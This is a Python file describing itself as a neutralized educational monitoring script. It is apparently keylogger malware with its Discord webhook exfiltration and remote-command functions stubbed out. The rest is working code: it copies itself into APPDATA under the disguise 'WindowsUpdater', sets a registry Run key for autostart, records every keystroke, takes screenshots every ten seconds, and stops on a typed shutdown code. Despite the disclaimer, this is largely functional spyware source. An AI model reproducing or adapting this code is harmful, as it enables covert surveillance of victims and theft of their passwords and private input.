"""
==============================================================================
FUMO Educational Monitoring Script (Neutralized Version)
Copyright © 2025 MOWA. All rights reserved.

This version is modified for educational and cybersecurity analysis purposes.
It contains no networking functionality or malicious behavior.

DO NOT use this code for illegal activity. Unauthorized access or monitoring
is strictly prohibited and punishable under law.
==============================================================================
"""

import os
import shutil
import winreg
import sys
import subprocess
import threading
import platform
import uuid
import io
from pynput import keyboard
from PIL import ImageGrab
import time

# ====== CONFIG ======
WEBHOOK_URL = ""  # Removed webhook
BACKUP_URL = ""  # Disabled
APPDATA = os.getenv("APPDATA")
TARGET_PATH = os.path.join(APPDATA, "WindowsUpdater", "main.exe")
PC_ID = f"{platform.node()}-{uuid.getnode()}"
SHUTDOWN_CODE = "8100243427"
IS_SETUP_PHASE = os.path.realpath(sys.argv[0]) != TARGET_PATH
LOCK_FILE = os.path.join(os.getenv("TEMP"), "WinUpdater.lock")

log = ""
buffer = ""
listener = None
has_sent_startup = False
has_sent_restore_msg = False
screenshot_active = True

# ====== SINGLE INSTANCE CHECK ======
if os.path.exists(LOCK_FILE):
    sys.exit()
with open(LOCK_FILE, 'w') as f:
    f.write("locked")

# ====== LOGGING (Simulated) ======
def send_to_discord(data):
    if not data:
        return
    print(f"[LOG - {PC_ID}] {data}")

def send_screenshot():
    try:
        screenshot = ImageGrab.grab()
        print(f"[SCREENSHOT] Screenshot captured from {PC_ID}")
    except Exception as e:
        print(f"Screenshot error: {e}")

def screenshot_loop():
    global screenshot_active
    while True:
        if screenshot_active:
            send_screenshot()
        time.sleep(10)

# ====== DELETION CHECK ======
def check_if_deleted():
    if not os.path.exists(TARGET_PATH) and not IS_SETUP_PHASE:
        send_to_discord("Cleanup triggered (file deleted).")
        sys.exit()

# ====== RESTORE FILE IF DELETED (Disabled) ======
def ensure_file_persistence():
    if not os.path.exists(TARGET_PATH):
        print("[RESTORE] File missing. Restore skipped (disabled).")

# ====== COPY TO APPDATA + AUTOSTART ======
def setup_persistence():
    current_path = os.path.realpath(sys.argv[0])
    if IS_SETUP_PHASE:
        try:
            if current_path.lower() == TARGET_PATH.lower():
                return
            if os.path.exists(TARGET_PATH):
                os.remove(TARGET_PATH)
            os.makedirs(os.path.dirname(TARGET_PATH), exist_ok=True)
            shutil.copy2(current_path, TARGET_PATH)

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WinUpdater", 0, winreg.REG_SZ, TARGET_PATH)
            winreg.CloseKey(key)

            subprocess.Popen([TARGET_PATH], shell=False)
            sys.exit()
        except Exception as e:
            send_to_discord(f"Setup failed: {e}")

# ====== REMOTE COMMANDS (Disabled) ======
def poll_remote_command():
    def check():
        print("[COMMAND CHECK] Remote command check disabled.")
        threading.Timer(10, check).start()
    check()

# ====== KEYLOGGER ======
def write_log_periodically():
    global log
    if "\n" in log or len(log) >= 100:
        send_to_discord(log.strip())
        log = ""
    threading.Timer(2, write_log_periodically).start()

def on_press(key):
    global log, buffer
    try:
        char = key.char
        log += char
        buffer += char
    except AttributeError:
        name = str(key).replace("Key.", "")
        if name == "space":
            log += " "
            buffer += " "
        elif name == "enter":
            log += "\n"
        else:
            log += f"[{name}]"

    clean_buffer = ''.join(c for c in buffer if c.isdigit())
    if SHUTDOWN_CODE in clean_buffer:
        send_to_discord("Shutdown code entered.")
        os._exit(0)

    buffer = buffer[-50:]

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    write_log_periodically()
    listener.join()

# ====== MAIN ======
try:
    check_if_deleted()
    ensure_file_persistence()
    setup_persistence()
    poll_remote_command()
    threading.Thread(target=screenshot_loop, daemon=True).start()
    start_keylogger()
finally:
    try:
        os.remove(LOCK_FILE)
    except:
        pass
